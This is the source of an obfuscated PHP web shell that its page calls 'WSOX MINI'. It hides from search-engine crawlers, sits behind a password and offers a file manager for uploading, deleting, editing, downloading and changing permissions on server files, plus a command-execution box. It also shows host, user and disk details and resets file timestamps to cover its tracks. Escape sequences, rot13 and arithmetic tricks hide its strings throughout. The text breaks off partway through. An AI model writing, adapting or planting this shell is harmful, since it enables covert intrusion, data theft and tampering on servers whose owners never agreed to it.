<?php
$ps="de9\x31\070f6ea2e947\x39ed9d81a814\067\144bae3d";$_vza="#df5";$_smp="fm";$default_charset="Windows-1\06251";if(!empty($_SERVER["HTTP_USER_AGENT"])){$_wejg=array("\107oogle","Slurp","MSNBot","ia_ar\x63hiver","\131an\144\x65x","Ra\x6dbler");if(@Preg_mATcH("/".join("|",$_wejg)."/i",$_SERVER["HTT\120_USER_AGENT"])){HEADEr("HT\x54P\x2f1.0 404 Not\040Found");exit;}}if(FuNCtioN_exIsTS("ver\x73ion\x5f\143ompare")&&FuNCTIoN_ExISts("phpversio\156")){if(VeRsiON_cOMPARe(pHPVersIOn(),"5.\x34.0","<"))@magic_quotes_runtime((int)round(0+0));}if(FunctioN_EXisTs("get_\x6d\x61gic_quotes_gpc")&&FUncTion_ExISTs("a\x72ray_ma\x70")&&FunctION_EXIsTs("stripslashes"))if(get_MaGic_qUoTEs_GpC()){function wSs($_tu){return IS_ArRAY($_tu)?arrAy_Map("WSS",$_tu):STriPSlAsHeS($_tu);}$_POST=wSS($_POST);$_COOKIE=wSS($_COOKIE);}function _ÇÞ(){die("<for\x6d method=post><input \164ype=\160assword\040nam\x65=ps><input type\x3dsu\x62m\x69t valu\145='\x3e>'></form>");}function _ÜÔ($_lyfl,$_kg){$_COOKIE[$_lyfl]=$_kg;SETCOOKie($_lyfl,$_kg);}if(!empty($ps)){$cook=suBstR(Md5($_SERVER["HTTP_HOS\x54"]),(int)round(0+0+0),-154+157);if(isset($_POST["ps"])&&(md5($_POST["ps"])==$ps))_ÜÔ($cook,$ps);if(!isset($_COOKIE[$cook])||($_COOKIE[$cook]!=$ps))_ÇÞ();}if(sTrTOlOWeR(SuBstr(PHP_OS,263+-214+-49,574+-571))=="w\x69n")$os="wi\156";else $os="nix";if(functiOn_EXiSTS("ini\x5fge\164")){$safe_mode=@INI_Get("safe_mode");$disable_functions=@Ini_gET("disa\x62le_functions");}if(fUNCtion_eXIsTs("getcwd"))$home_cwd=@gEtCWD();else $home_cwd=@DIRnAME(__FILE__);if(isset($_POST["c"])&&$_POST["c"]!="")$_POST["c"]=Str_roT13($_POST["c"]);if(isset($_POST["c"])){if(FunCTiOn_ExISTS("ch\144ir"))@ChDIr($_POST["c"]);}if(fuNCTioN_EXIsTS("get\x63wd")){$cwd=@GETCwD();}elseif(isset($_POST["c"])&&$_POST["c"]!="")$cwd=$_POST["\143"];else $cwd=$home_cwd;if($os=="wi\x6e"){$home_cwd=Str_rEpLAcE("\134","/",$home_cwd);$cwd=STr_rEPlaCE("\x5c","/",$cwd);}if($cwd[stRLeN($cwd)-(int)round(0.33333333333333+0.33333333333333+0.33333333333333)]!="\057")$cwd.="/";function _Ø‰’(){if(empty($_POST["ch"]))$_POST["ch"]=$GLOBALS["default\137charset"];global $_vza;echo"<\150tml><head><met\x61 http-\x65\x71uiv='Content-\124ype' conte\156t='\164ext/h\x74ml; c\150\141rset=".$_POST["\x63h"]."'><t\151tle>".$_SERVER["HTTP_HOST"]." - WSOX M\x49NI</title>\x0d\x0a<style>\015\x0abody{back\147ro\x75nd-color:#444;col\157r:#e1e1e1;}\x0d\012body,td,t\150{ font: 9pt\x20Lucida,Verdana;m\141rgi\156:0;v\x65rtical-align\072top\073color:#e1e1e1; }\x0d\x0atable.info{ color\072#ff\146;background-color:#22\x32; }\015\x0aspan,h1,a{ color: ".$_vza." !i\155po\x72tant; }\015\012s\160\x61n{ font\055w\x65ight: bolder; }\015\012span.wfw{font-weight:norma\154;}\x0d\x0a\x681{ bord\145r-left:5px\x20so\154id ".$_vza.";paddi\x6eg\072 2\x70x 5\160x;font: 14pt V\145rdana;backg\x72ound\x2dcol\x6fr:\043222;margi\156:0px;\040}\015\x0adiv.cont\x65\x6et\x7b padding: 5px;ma\162gi\156-left:5px;background-co\x6cor:#333; }\015\012a{ te\x78t-de\143oration\x3anone; \x7d\015\x0a\141:\x68\157ver{ tex\x74-decoration:underlin\145; }\x0d\012.ml1{ bor\144er:1\x70x\040solid #\x344\064;padding:5px\073margin:0;overfl\x6fw: au\164\157\073 }\x0d\012.bigarea{ width:100%;height:300px; }\x0d\x0ainput,textare\141,se\154ect{ margin:0;color:#\146ff;b\x61ckgroun\144-\x63olor:#555;borde\x72:1px solid ".$_vza."; fo\x6e\x74:\x209pt Monospace,\x27\103ourier N\x65w'; }\015\012form\173 m\141rgin:0p\x78; }\x0d\x0a#toolsTbl{ text\055align:center; }\x0d\x0a.toolsI\156p{ widt\150: 300px \175\015\x0a.main th{text-align:left\x3bb\141ckground-color:#5e\065e5e;}\015\x0a.main tr:hover{backgro\165nd-color\x3a#5e5e5e}\015\x0a.l1{background-color\072#444}\x0d\012.l2\x7bba\x63kground-co\154or:#333}\015\012pre{\146ont-famil\x79:Courier,Monospace\073\x7d\015\012<\057style>\x0d\012\074script>\x0d\x0a    var c_ = \047".HTMlSpeCIaLChaRS(str_ROT13($GLOBALS["cwd"]))."\x27;\015\012    var a_ = '".HTmlSpeCiAlcharS($_POST["a"])."'\x0d\012    var ch_ = '".hTmlSPeCiALcHars($_POST["ch"])."'\x3b\x0d\x0a \x20  var p_ \075 '".((sTRpOs($_POST["p"],"\x0a")!==false)?"":HTmlSpEciAlCHarS($_POST["\160"],254+-251))."';\015\012    var x_ =\040'".((sTRpOs($_POST["x"],"\x0a")!==false)?"":HTMLSpeCIAlChaRS($_POST["x"],55- -16-68))."';\x0d\012    \166ar\x20s_ = '".((Strpos($_POST["s"],"\012")!==false)?"":HTMlSPEcIaLchARS($_POST["s"],151+-303+155))."';\x0d\x0a    var d = document;\x0d\x0a\011\x66unc\x74ion set(a\x2cc,p,x,\x73\054ch)\x20{\x0d\x0a\011\011if(a!=null)d.mf.a.value=a;else d.\x6df.a.value=a_;\x0d\x0a\011\x09if(c!=null)d\056mf.c\x2eval\x75e=c;else d.m\x66.c.v\x61lue=c_;\015\x0a\x09\x09if(p\041=nul\154)d.\x6df\x2ep.value=p;els\x65 d.mf.p.value=p_;\x0d\012\x09\011if(x\x21=null)d.\155f.\x78\056value=x\x3belse d.mf.x.val\165e=x\137;\015\x0a\011\x09if(s!\075nul\x6c)\144.mf.s.value=s;else d.mf.s\x2evalue=s_;\015\x0a\011\011\151f(ch!\075\x6eull)d.mf\x2ech.val\x75e=ch;else d.mf.ch\x2ev\x61\154ue=ch\137;\x0d\x0a\011\x7d\015\012\011f\x75nction g(a,c,\x70,x,s\x2cc\x68)\040{\015\012\x09\x09set(a,c,p,x,s,ch);\x0d\x0a\011\x09d.\155f.submit();\x0d\012\011}\x0d\x0a\x09function utoa(str) {\015\x0a\x09\x09return window.bto\x61(unes\x63ape(\145ncod\145UR\111Compo\x6eent(str)));\x0d\012\x09}\015\x0a\011fu\156ction atou(st\x72) {\x0d\x0a\011\x09return dec\x6fd\x65\125RIComponen\164(escape(window.\x61tob(str)));\015\x0a\011}\015\x0a\011function rot1\063(str) {\015\x0a\x09  var in\x70ut     = 'ABCDEFGHIJKLMNOPQ\x52STU\x56WXYZabcde\146ghijklmnopqrstuvwx\x79z';\015\012\x09  v\x61\x72\040outp\165t    =\040'\116O\120QRSTU\126W\130YZABCDEFGHIJKL\x4d\x6eopqr\x73tuv\x77xyzabcdefghi\x6aklm';\x0d\012\011 \x20\x76ar index     = x => inp\165\x74.i\x6ed\x65x\x4ff(x);\015\012\x09\x20 var trans\154ate = x => in\x64ex(x) \076 -1\040? output[\151ndex(x)] : x;\015\012\x09  re\164\165rn str.split\x28'').map(transla\164\145).j\x6fin('')\073\x0d\012\x09}\015\012\x09var c\166is = false;\x0d\012\011functio\x6e sh\x6f\x77(){\x0d\012\x09\x09if\050!cvis\051 {\x0d\x0a\011\011\011document.getElementById('bat\x27).innerHTM\x4c = \047Link\163';\015\x0a\x09\011\x09doc\x75me\156t.\147et\x45lementById('cwd').styl\145.disp\154ay = 'inline';\015\012\011\x09\x09d\157cument.getElemen\164ById('links').st\x79le.display = '\156one';\x0d\x0a\x09\011\x09cvis = true;\015\012\x09\x09} else {\x0d\x0a\011\x09\011document.get\105lem\x65ntById('bat')\x2einnerHTML =\040'Text';\x0d\012\x09\x09\x09\144ocument.getEleme\x6etById(\x27cw\x64').style.displa\171 = 'non\x65'\x3b\x0d\x0a\x09\x09\x09d\157\143ument.getElement\x42yId('links')\x2estyle.display \x3d '\151nline';\011\x0d\012\011\x09\011\143vi\x73\x20= false;\x0d\x0a\011\011}\x0d\012\x09}\015\012</sc\162\x69pt>\x0d\012<head\x3e\x3cbody><div style='posi\164io\x6e:abso\x6c\165t\x65;width\x3a\x3100\045;bac\x6bground-color:#444;top:0;left:0;'>\015\012<form \x6de\164h\157d=po\x73t name\075\x6df style='display:none;'>\x0d\012<input typ\145=hidden\040na\155\x65=a>\015\x0a<\151np\x75\164 type\075hidden name=c>\x0d\x0a<i\156put \x74ype=hidde\156 n\x61me\x3dp>\015\012<input typ\145=hidden name=x\x3e\015\x0a\x3cinput type\075hidden name\x3ds>\x0d\x0a<i\x6ep\x75t type=hi\144den \156ame=c\150\076\015\012</form>";if(fUncTIoN_EXISTS("diskfreespace"))$_rw=@disKFrEespace($GLOBALS["cw\144"]);if(fUncTIOn_exIsts("disk_\x74otal_\x73pace"))$_jl=@dISk_TOtAL_sPaCe($GLOBALS["cw\144"]);$_jl=$_jl?$_jl:-299+526-226;if(fUnctION_exISts("php_\165na\x6de")){$_mfvu=@PHp_uName();$_ubac=@PhP_UNaME("r");$_bmh=@Php_UName("s");}if(!FUNCTIOn_eXiSTS("posi\170_getegid")){if(funcTiOn_ExIsTS("get_curre\156t_user"))$_hb=@gEt_cuRREnt_uSer();if(fuNCtiOn_ExIsTS("getmyuid"))$_mkds=@gEtMyuId();if(fuNcTioN_EXISTs("getmygid"))$_ltxp=@getmygid();$_vx="?";}else{$_mkds=@poSIx_GETPWUId(@pOSiX_gEteUiD());$_ltxp=@poSIX_getgRGid(@posiX_GETEgiD());$_hb=$_mkds["name"];$_mkds=$_mkds["uid"];$_vx=$_ltxp["name"];$_ltxp=$_ltxp["gid"];}if(fUnctIoN_exIsTS("m\142_det\145\143t_en\143o\144i\x6eg")&&FuNcTioN_ExIsTS("iconv"))if(@Mb_dEtEct_EncODIng($_hb,"Windows-12\x351")){$_hb=@Iconv("Windows-1251","\125TF-8",$_hb);}$cwd_links="";$_cm=ExpLoDE("\057",$GLOBALS["c\167d"]);$_pfy=CoUnT($_cm);for($_wvlc=(int)round(0+0+0);$_wvlc<$_pfy-(int)round(0.5+0.5);$_wvlc++){$cwd_links.="<a href\075'#' onclick\x3d'g(\x22fm\042,\042";for($_ra=(int)round(0+0+0);$_ra<=$_wvlc;$_ra++)$cwd_links.=StR_rOT13($_cm[$_ra])."/";$cwd_links.="\x22,\x22\042,\x22\x22)'>".$_cm[$_wvlc]."/<\057a>";}$_fv=array("UTF-8","W\151ndows-1251","KOI\x38-R","KOI8-U","cp866");$_oai="";foreach($_fv as$_iq)$_oai.="<option value=\042".$_iq."\042 ".($_POST["ch"]==$_iq?"selected":"").">".$_iq."<\x2foption>";$_el=array("Files"=>"fm");if(!empty($GLOBALS["ps"]))$_el["Lo\147out"]="Logou\164";$_el["Self r\x65move"]="SelfRemove";$_ubi="";foreach($_el as$_lyfl=>$_kg)$_ubi.="<th width=\042".(int)((int)round(50+50)/cOUNt($_el))."%\042>\x5b <a href=\042#\042 onclick=\x22g('".$_kg."',nul\154,'','\x27,'')\042>".$_lyfl."</a> ]<\057th>";$drives="";if($GLOBALS["os"]=="wi\156"){foreach(ranGe("c","z") as$drive)if(IS_dIR($drive.":\134"))$drives.="\074a href=\042#\042 o\x6eclick=\042\147('fm','".stR_rOt13($drive).":/')\x22\076[ ".$drive."\x20]</a> ";}echo"<\x74ab\x6ce\x20class=\151nfo cellpadding=\x33 cellspac\151ng=0 width=100%\076<tr><td width=1><spa\x6e>Uname:<br>User:<br>P\150p:<br>Hdd:<br>Cwd\x3a".($GLOBALS["os"]=="win"?"<br>Drive\163:":"")."</span><\x2ftd>"."<td><nobr>".($_mfvu?suBStR($_mfvu,(int)round(0+0+0),-445+565):"\116\057A")."</n\157br><br>".$_mkds." ( ".$_hb." ) <span>Group\x3a</span\076 ".$_ltxp." ( ".$_vx." \x29<\x62r>".@PHPVeRsIon()." <span>Safe mode\072</sp\141n> ".($GLOBALS["\x73afe_mode"]?"<font\040col\157r=red\076ON</\146ont>":"<fon\164 color=green><b>OF\106</\142></font>")." <a\040href=# on\x63lick=\x22g('Ph\160'\054null\x2c'',\047info')\042>[ phpinfo\040]<\x2f\x61\x3e <span>Dat\145ti\x6de:</span> ".daTE("Y-m-d H:i:s")."<br\x3e".($_jl?_…ÚÐ($_jl):"")." <span>Fr\145e\072</sp\141n> ".($_rw?_…ÚÐ($_rw):"")." (".(($_rw&&$_jl)?(int)($_rw/$_jl*(116+-16)):"0")."%)<br><span id=\x22links\x22\x20c\x6cass\x3d\x22wfw\x22>".$cwd_links."\x20"._Ä¦($GLOBALS["cwd"])."\x20<\x61 \150r\x65f=\x23\040onc\x6cick=\042g('f\155','".StR_rot13($GLOBALS["home_cwd"])."','',\047','')\x22>[ home\x20\135</a><\x2fsp\141n\076<span id=\x22cwd\x22 s\x74yle=\x22display: none;\x22 class=\042wfw\042><i\x6eput si\x7ae=".(strLEN($GLOBALS["cwd"])+(int)round(3+3))." type\x3dtext value=\042".$GLOBALS["cw\144"]."\042\076</span> <a\040href\x3d# oncli\x63k=\x22show(\051;\x22><\x66ont c\157lor=#ff\146 id=\042bat\042>Text</font></a><br>".$drives."</td>"."<td width=1\x20alig\x6e=\162ight><nobr><select onchange=\x22g(null\054n\165ll,".(!empty($_POST["p"])?"'".STr_rot13($_POST["p"])."'":"\156\x75ll").",n\165l\x6c,\x6eul\x6c,this.\x76alue\051\x22\x3e<optgroup l\x61bel=\042Pa\147e charset\042>".$_oai."\x3c\057opt\147roup></select><br><s\x70an>S\x65rver IP:</spa\156><br>".$_SERVER["SERVER_AD\x44R"]."<br\076<span>\x43lient IP:</\163pan>\074\142\x72>".$_SERVER["REMO\124E_ADDR"]."</nob\162><\057td></tr></table>"."<table st\x79le\x3d\042bo\x72der-t\x6fp:\x32px so\154id \x23333;\x22 cellpaddin\147=3 \x63ellsp\141cing=0 width=100%><tr>".$_ubi."</tr><\x2ft\141ble><\x64iv style=\x22margin:5\042>";}function _Û–˜Ò(){$_ue=is_WriTaBlE($GLOBALS["c\x77d"])?" <font color='green\x27>(Writeabl\x65)</font>":" <\146ont co\154or=\162ed>(Not writabl\x65)</font>";echo"\x0d\x0a</div\x3e\x0d\x0a<t\x61ble\x20class=info id=tool\163Tbl cellpa\144ding=3 cellspacing=0 width=100%\040 style=\x27\142\x6frder-top:2px solid #333;b\157rder-bottom:2px\x20\163ol\151d #333;'>\x0d\x0a\011<tr>\x0d\x0a\x09\011<td><form o\156sub\x6dit='\x67\x28nul\x6c,\162ot13(thi\x73.\143\x2eva\154u\145),\x22\x22);retur\x6e false;'><span>Change dir:</span><b\x72><input c\x6cass='toolsInp\x27 type=text name=c value='".htmlSpeCIAlcHaRs($GLOBALS["cwd"])."'><i\x6ep\x75\x74 type\075submit \166alue='>>'\x3e</\146orm\x3e</td>\015\x0a\x09\011<t\144><\146orm onsubmit=\042g('ft',null,rot13(th\x69s.\146.value));re\164urn fal\x73e;\x22\x3e<spa\156>Read\x20file:</span><b\x72><in\160ut \143la\x73\163='\x74\x6folsI\156p' ty\x70e=text name=f><inp\x75t type=sub\155it valu\145='>>'></form>\x3c/\x74d>\x0d\x0a\011<\x2ftr><tr>\015\012\011\011<td><form onsubmi\x74\x3d\x22g('\x66m',null,'mkdir',rot\x313(t\150is\x2ed.\166alue));\x72eturn fal\x73e;\x22\076<span>Make dir\x3a</\163pan\x3e".$_ue."<br><input\x20class='tools\111np' \x74ype=text\x20name=d><input type\075submit value=\047>>'></form></td>\x0d\x0a\x09\x09<td><form onsubmit\x3d\x22g('ft',nul\x6c,rot13(thi\x73.\x66.\166alue),'mk\146ile');return fa\154se;\x22><span>Make file:</span\076".$_ue."<br\076<i\156put \143lass='\164oolsInp' t\171pe=text na\155\x65=f><i\156put type=s\x75bmit value='>>'></form></td>\015\012\011</tr><tr\x3e\x0d\012\x09\011<td><\x66orm ons\x75bmit=\x22\x67('ce',null,u\164oa(this.c.va\154ue));\x72\145turn fal\163\x65;\x22>\074spa\x6e>Ex\x65cute:</span><br><input class='t\157ol\x73\x49n\x70' \164ype=text\x20name=\x63 val\165e=''><in\160ut type=submit value='\076>'></\x66orm></td>\015\012\011\011<t\144><form \x6dethod='post' ENCTYPE='multipart/fo\x72m\055data'>\x0d\x0a\011\011<input type\075hidden name=a value='fm'>\015\x0a\x09\011<\x69nput type=hidden name=\143 value=\047".sTR_rot13($GLOBALS["cwd"])."'>\015\012\011\x09\074inpu\164 t\171pe=hidden name=p value='uploadF\x69le'>\x0d\x0a\011\x09<input\x20type=hidden nam\x65\075\143h value='".(isset($_POST["ch"])?$_POST["ch"]:"")."'>\x0d\x0a\011\011<sp\x61n>Upload file:</span>".$_ue."<b\x72><inpu\x74\x20\x63lass='toolsInp' t\171pe=fi\x6ce name=f><i\156put type=submit value\x3d'>>'></form\x3e<br  ></td>\x0d\012\x09</t\x72></table></div></bo\x64y></html\x3e";}if(!funCTIon_existS("p\x6fsix_g\145tpwuid")&&(sTrPOS($GLOBALS["disable\x5ffuncti\157ns"],"po\163ix_getp\x77ui\x64")===false)){function POSiX_GEtPwUID($_hp){return false;}}if(!fuNcTioN_exiStS("\x70osix_getgrg\151d")&&(STRPOS($GLOBALS["disable_functions"],"po\163ix\x5fgetgrgid")===false)){function PoSIx_gETgRGid($_hp){return false;}}function _…ÚÐ($_hu){if(Is_InT($_hu))$_hu=sprInTF("%u",$_hu);if($_hu>=(int)round(357913941.33333+357913941.33333+357913941.33333))return SPrInTF("\0451.2f",$_hu/(1073742042-1073741162- -1073740944))." GB";elseif($_hu>=(int)round(349525.33333333+349525.33333333+349525.33333333))return spRINTF("%\061.2f",$_hu/(int)round(349525.33333333+349525.33333333+349525.33333333))." MB";elseif($_hu>=(1185+623+-784))return spRInTf("%1.2\146",$_hu/(869+1111+-956))." KB";else return$_hu." B";}function _©‘Ë($_hp){if(($_hp&(48921- -231))==(48651+49406+-48905))$_wvlc="\x73";elseif(($_hp&(int)round(20480+20480))==(int)round(20480+20480))$_wvlc="l";elseif(($_hp&(int)round(16384+16384))==(int)round(10922.666666667+10922.666666667+10922.666666667))$_wvlc="-";elseif(($_hp&(24784+25233-25441))==(int)round(8192+8192+8192))$_wvlc="b";elseif(($_hp&(16322- -62))==(int)round(8192+8192))$_wvlc="d";elseif(($_hp&(8257-8400- -8335))==(int)round(2730.6666666667+2730.6666666667+2730.6666666667))$_wvlc="c";elseif(($_hp&(4229-3995+3862))==(4344+-248))$_wvlc="p";else $_wvlc="u";$_wvlc.=(($_hp&(int)round(85.333333333333+85.333333333333+85.333333333333))?"r":"-");$_wvlc.=(($_hp&(348-145-75))?"w":"-");$_wvlc.=(($_hp&(int)round(21.333333333333+21.333333333333+21.333333333333))?(($_hp&(int)round(1024+1024))?"s":"x"):(($_hp&(2161+-113))?"S":"-"));$_wvlc.=(($_hp&(int)round(10.666666666667+10.666666666667+10.666666666667))?"r":"-");$_wvlc.=(($_hp&(156+-140))?"w":"-");$_wvlc.=(($_hp&(int)round(4+4))?(($_hp&(1318+-294))?"s":"x"):(($_hp&(1019+5))?"S":"-"));$_wvlc.=(($_hp&(-751+755))?"r":"-");$_wvlc.=(($_hp&(int)round(0.66666666666667+0.66666666666667+0.66666666666667))?"w":"-");$_wvlc.=(($_hp&(int)round(0.33333333333333+0.33333333333333+0.33333333333333))?(($_hp&(int)round(170.66666666667+170.66666666667+170.66666666667))?"t":"x"):(($_hp&(827-315))?"T":"-"));return$_wvlc;}function _Ä¦($_xw){if(!@IS_ReaDABLe($_xw))return"<f\157\x6et c\x6f\x6cor=#FF0000>"._©‘Ë(@FilepermS($_xw))."</font>";elseif(!@iS_writaBLe($_xw))return"<\146ont color=\167h\x69te>"._©‘Ë(@fIlEPeRMS($_xw))."</font>";else return"<font \x63olor\075#25ff00>"._©‘Ë(@FilePERMs($_xw))."</f\157nt>";}function _¹Ž($_ioko){if(fUnCTIOn_ExiSts("scandi\x72")){return scAnDir($_ioko);}else{$_ip=opeNdIr($_ioko);while(false!==($_io=rEadDir($_ip)))$_jsm[]=$_io;return$_jsm;}}function acTiONfM(){if(!empty($_COOKIE["f"]))$_COOKIE["f"]=@UNsERIAlIZE($_COOKIE["f"]);if(!empty($_POST["p"])){$_rdbd=@FilemTiME($_POST["\x63"]);switch($_POST["p"]){case "uploadFile":if(!@mOve_uPLoADeD_FIlE($_FILES["f"]["tmp_na\x6de"],$_FILES["f"]["name"]))echo"Can't uploa\144 file!";elseif($_rdbd)toUcH($_FILES["\x66"]["name"],$_rdbd,$_rdbd);break;case "delete":function _ÞÍ»Ó($_cm){$_cm=(SubSTr($_cm,-(int)round(0.5+0.5))=="/")?$_cm:$_cm."/";$_ip=opENdIr($_cm);while(($_iq=reAddIR($_ip))!==false){$_iq=$_cm.$_iq;if((BasENAme($_iq)=="..")||(baseNamE($_iq)=="."))continue;$_qhh=FilEtype($_iq);if($_qhh=="dir")_ÞÍ»Ó($_iq);else @uNlINK($_iq);}ClOSEdiR($_ip);@RMdir($_cm);}if(iS_aRrAY($_POST["f"]))foreach($_POST["f"] as$_xw){if($_xw=="..")continue;$_xw=sTr_rot13(uRldeCODE($_xw));echo$_xw;if(Is_diR($_xw))_ÞÍ»Ó($_xw);else @Unlink($_xw);}break;}if($_rdbd)ToUCh($_POST["c"],$_rdbd,$_rdbd);}_Ø‰’();echo"<h1>File m\x61n\141\x67er</h1\076<div cla\163s\x3dcontent><script>p_\x3dx\137=s_=\x22\042;</\x73cript>";$_zka=_¹Ž(isset($_POST["c"])?$_POST["c"]:$GLOBALS["c\167d"]);if($_zka===false){echo"Can't \157pen this\040folder!";_Û–˜Ò();return;}global $sort;$sort=array("name",(int)round(0.33333333333333+0.33333333333333+0.33333333333333));echo"<scrip\164>\x0d\x0a\x09function sa(\051 {\x0d\x0a\011\x09for(i=0;i<d.files.eleme\156ts.\154ength;i++)\x0d\x0a\x09\011\x09if(d.files\x2eelements[\x69]\x2etype \x3d= '\x63heckbo\x78')\x0d\x0a\011\011\011\011d.fil\145s.eleme\x6ets[\x69\135.checked = d.\146il\145s.e\154eme\x6ets[0].\x63hecked;\015\x0a\x09\175\x0d\x0a</\x73cript>\015\012<t\x61ble\x20width\x3d'10\060%' class='m\x61in' cellspacing='0' cellpa\x64ding='2'>\x0d\012<form name=files\040m\145thod=pos\164><tr><th width='\x31\x33px'>\074input ty\x70e=\x63heckbo\x78 onclick='sa(\051' class=chkb\170></th><\x74h>\x4ea\x6de</th><t\150>Size</th><th\076Modify<\057\x74h><th>O\x77ne\162/G\x72oup</th><th>Permissions</th><\164h>Actions\x3c/t\x68>\x3c\x2ftr>";$_tge=$_jsm=array();$_pfy=couNt($_zka);for($_wvlc=(int)round(0+0);$_wvlc<$_pfy;$_wvlc++){if(funCTION_eXIStS("posix_\147etpwuid")){$_dirj=@PosIx_GETpWUid(@fileOwner($_zka[$_wvlc]));$_vk=@POSix_geTGRgId(@fILEgroup($_zka[$_wvlc]));}$_mok=array("name"=>$_zka[$_wvlc],"path"=>$GLOBALS["cwd"].$_zka[$_wvlc],"modify"=>daTE("Y-\x6d-d H:i:s",@FilemtIMe($GLOBALS["cwd"].$_zka[$_wvlc])),"perms"=>_Ä¦($GLOBALS["cwd"].$_zka[$_wvlc]),"size"=>@fILeSIze($GLOBALS["cw\144"].$_zka[$_wvlc]),"owner"=>$_dirj["name"]?$_dirj["\x6eame"]:@fileOwner($_zka[$_wvlc]),"group"=>$_vk["name"]?$_vk["name"]:@FIlEgROUP($_zka[$_wvlc]));if(@is_fiLE($GLOBALS["\143wd"].$_zka[$_wvlc]))$_jsm[]=arraY_MeRGE($_mok,array("type"=>"\146ile"));elseif(@Is_LINK($GLOBALS["cwd"].$_zka[$_wvlc]))$_tge[]=Array_Merge($_mok,array("type"=>"link","\154ink"=>rEADLiNk($_mok["path"])));elseif(@IS_dir($GLOBALS["cwd"].$_zka[$_wvlc]))$_tge[]=ArRAy_mErgE($_mok,array("type"=>"dir"));}$GLOBALS["sor\164"]=$sort;function Wcmp($_av,$_wr){return strCMP(strtOlOweR($_av[$GLOBALS["sor\x74"][266- -235+-501]]),sTRtOLOWer($_wr[$GLOBALS["sort"][-376+376]]))*($GLOBALS["s\157rt"][(int)round(0.5+0.5)]?278+-321+44:-(int)round(0.33333333333333+0.33333333333333+0.33333333333333));}USoRt($_jsm,"wC\x6dp");USOrT($_tge,"wC\x6dp");$_jsm=aRRAY_MeRge($_tge,$_jsm);$_wkfe=(70- -168+-238);foreach($_jsm as$_xw){$_otf=sTR_ROt13(URLeNCOdE($_xw["name"]));echo"<tr".($_wkfe?" class=l1":"")."><td><input ty\160e=checkb\x6fx name\075\x22f[]\042 val\165e=\042".$_otf."\042 \x63lass=chkbx></td><td><a href=# onclick=\x22".(($_xw["type"]=="f\151le")?"g(\047ft',n\165ll,'".$_otf."\047\x2c\x20'view')\042>".htmLspECIALCHaRS($_xw["\x6eame"]):"g('fm'\054'".Str_rOt13($_xw["pat\150"])."');\x22 ".(empty($_xw["link"])?"":"title='".$_xw["link"]."'")."><b>[ ".hTMlspEcIaLCHArs($_xw["name"])." ]</\142>")."\074\x2fa></td><td>".(($_xw["type"]=="file")?_…ÚÐ($_xw["size"]):$_xw["type"])."<\x2ftd><td>".$_xw["modify"]."</td><td>".$_xw["owner"]."/".$_xw["gr\x6fup"]."</td><\164d><a href=\x23 onclick=\042g('ft',null,'".$_otf."','\143hmod')\x22>".$_xw["perms"]."</td><td\x3e\074a href=\042\x23\x22 onc\x6cick=\042g\x28'ft',null,'".$_otf."',\x20'\x72enam\145')\042>\122</a> <a href=\x22#\x22 onclic\153=\042g('ft',null,'".$_otf."', 'tou\143h')\x22>\124<\057a>".(($_xw["type"]=="file")?" <a href=\042#\042 onclick=\x22g(\047ft',null,'".$_otf."\047\054\040'e\144i\x74')\x22>\105</\x61> <a href=\x22#\x22\x20onclick\075\042g('ft',null,'".$_otf."', 'download')\042>D</a>":"")."</td></tr>";$_wkfe=$_wkfe?470- -354+-824:(int)round(0.5+0.5);}echo"<tr><td\x20colspan=7>\015\x0a\x09<in\x70ut \164ype=hi\144\x64en name=a val\x75e='\x66m'>\015\x0a\011<input\x20type=hidden name=c v\141lue='".hTMLsPECIAlchars(sTr_rOT13($GLOBALS["cwd"]))."'\076\x0d\012\x09<i\156put type=hidd\x65n name=ch\x20value=\047".(isset($_POST["ch"])?$_POST["ch"]:"")."'>\x0d\x0a\x09<se\x6cect \156ame='p'><option value='delete'>D\145lete</option>";echo"</select>&nbsp;";echo"<input type='submit\047 value='>>'></td></t\162></f\x6fr\155></tab\x6c\x65\x3e</div>";_Û–˜Ò();}function ActiOnFt(){if(isset($_POST["p"]))$_POST["p"]=StR_rOT13(uRLdeCODE($_POST["p"]));if(isset($_POST["x"])){switch($_POST["x"]){case "downlo\x61d":if(@is_fIlE($_POST["\x70"])&&@iS_reaDABlE($_POST["p"])){OB_StarT("ob_gzhandler",(int)round(2048+2048));HEADer("Content-Dispo\x73ition: attac\150ment;\x20\146ilenam\x65=".BAsEnAme($_POST["p"]));if(fUnctioN_eXIsTS("mime_content_typ\145")){$_qhh=@MIme_ConTent_TYpe($_POST["p"]);HEAdeR("Cont\145nt-Type: ".$_qhh);}else HEAder("Content-Type: appl\x69\143atio\x6e/\x6fctet-stream");$_tdtc=@fopEn($_POST["p"],"r");if($_tdtc){while(!@FEOF($_tdtc))echo @FgetS($_tdtc,966- -58);fcloSe($_tdtc);}}exit;break;case "mkfile":if(!FILE_eXiSts($_POST["p"])){$_ujhi=@filemtImE($_POST["c"]);$_tdtc=@FOpEN($_POST["\160"],"w");if($_tdtc){$_POST["x"]="edit";FCLOSE($_tdtc);if($_ujhi){tOUch($_POST["c"],$_ujhi,$_ujhi);touCh($_POST["p"],$_ujhi,$_ujhi);}}}break;}}_Ø‰’();echo"<h1>File t\x6f\157ls</h1\x3e\x3cdiv cla\x73s=content>";if(!fIlE_exIStS($_POST["p"])){echo"Fi\x6ce not exis\164s";_Û–˜Ò();return;}$_mkds=@posIx_GEtpwuiD(@fIleoWner($_POST["p"]));if(!$_mkds){$_mkds["name"]=@fIlEOwner($_POST["p"]);$_ltxp["name"]=@FiLEgrOup($_POST["p"]);}else $_ltxp=@POsIX_GeTgrGiD(@FIlegrOUp($_POST["p"]));echo"<span>Name:</span> ".hTmlSpeCiALchars(@BAsEnAme($_POST["p"]))." <span>Size:</sp\141n> ".(IS_FIle($_POST["p"])?_…ÚÐ(FIlESizE($_POST["p"])):"-")."\040<\163\160an>\x50ermi\163sion:<\057span>\040"._Ä¦($_POST["p"])." <span>\117wner\x2fGroup:</span>\x20".$_mkds["name"]."/".$_ltxp["n\141me"]."<br>";echo"<span>Chan\x67e time:</sp\x61n> ".dAtE("Y-m-d H:i:s",FILeCTimE($_POST["p"]))." <span>Access time:</span> ".DATE("Y-m-\144 \110:i:s",FiLEAtimE($_POST["p"]))." <span>Modify time:</span> ".DatE("Y-m-d H:i:s",fIleMtImE($_POST["p"]))."<br>\074br>";if(empty($_POST["x"]))$_POST["x"]="view";if(is_file($_POST["p"]))$_el=array("View","D\x6fwnl\x6fa\144","Edit","\103h\155od","R\145n\141me","Touch");else $_el=array("Chmod","\x52ename","\x54ouch");foreach($_el as$_kg)echo"<a hre\x66\x3d# 